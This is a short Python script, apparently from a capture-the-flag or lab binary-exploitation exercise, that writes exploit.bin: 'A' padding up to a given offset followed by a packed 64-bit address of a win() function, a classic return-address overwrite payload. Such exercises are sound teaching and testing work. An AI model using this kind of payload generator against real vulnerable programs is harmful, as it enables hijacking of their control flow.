
#!/usr/bin/env python3

import struct
import sys
from pathlib import Path

MAX_COPY = 512

if len(sys.argv) != 3:
    print("Usage: python3 make_payload.py <offset> <win_address>")
    sys.exit(1)

offset = int(sys.argv[1], 0)
win_address = int(sys.argv[2], 0)

if offset < 0 or offset + 8 > MAX_COPY:
    sys.exit("Error: payload exceeds the 512-byte read limit")

payload = b"A" * offset
payload += struct.pack("<Q", win_address)

Path("exploit.bin").write_bytes(payload)

print(f"Offset:          {offset} bytes")
print(f"win() address:   {hex(win_address)}")
print(f"Payload size:    {len(payload)} bytes")
print("Output:          exploit.bin")
